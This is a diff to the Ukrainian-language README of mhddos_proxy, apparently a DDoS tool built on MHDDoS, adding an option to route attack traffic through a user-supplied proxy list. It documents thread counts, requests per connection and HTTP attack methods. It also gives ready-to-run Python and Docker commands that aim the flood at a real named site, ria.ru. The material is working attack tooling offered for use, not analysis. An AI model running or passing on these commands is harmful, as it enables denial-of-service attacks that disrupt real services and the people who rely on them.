@@ -6,6 +6,7 @@
 
 ### ⏱ Останні оновлення
 
+- **04.04.2022** Додано можливість використання власного списку проксі для атаки - [інструкція](#власні-проксі)
 - **03.04.2022** Виправлена помилка Too many open files (дякую, @kobzar-darmogray та @euclid-catoptrics)
 - **02.04.2022** Робочі потоки більше не перезапускаються на кожен цикл, а використовуються повторно. Також виправлена робота Ctrl-C
 - **01.04.2022** Оновленно метод CFB у відповідності з MHDDoS. [Див. примітки нижче](#-попередження-щодо-деяких-методів-атаки)
@@ -89,7 +90,7 @@
     
     optional arguments:
       -h, --help             show this help message and exit
-      -c, --config URL|path  URL to remote or path to local config file (list of targets in plain text)
+      -c, --config URL|path  URL or local path to file with attack targets
       -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
       -p, --period 900       How often to update the proxies (default is 900)
       --table                Print log as table
@@ -97,7 +98,30 @@
       --vpn                  Disable proxies to use VPN
       --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
       --proxy-timeout 5      How many seconds to wait for the proxy to make a connection (default is 5)
+      --proxies URL|path     URL or local path to file with proxies to use
       --http-methods GET     List of HTTP(s) attack methods to use.
                              (default is GET, POST, STRESS, BOT, PPS)
                              Refer to MHDDoS docs for available options
                              (https://github.com/MHProDev/MHDDoS)
+
+### Власні проксі
+
+#### Формат файлу:
+
+    114.231.123.38:1234
+    http://114.231.123.38:5678
+    socks5://114.231.155.38:5678
+    socks4://114.231.123.38:1234
+    http://114.231.123.38:3065:username:password
+
+#### Для Python
+
+Покладіть файл поруч з `runner.py` і додайте до команди наступний прапорець (замініть `proxies.txt` на ім'я свого файлу)
+
+    python3 runner.py --proxies proxies.txt https://ria.ru
+
+#### Для Docker
+Потрібно монтувати volume щоби Docker мав доступ до файлу.  
+Обов'язково вказувати абсолютний шлях до файлу і не загубити `/` перед іменем файлу
+
+    docker run -it --rm --pull always -v /home/user/ddos/mhddos_proxy/proxies.txt:/proxies.txt ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --proxies /proxies.txt https://ria.ru
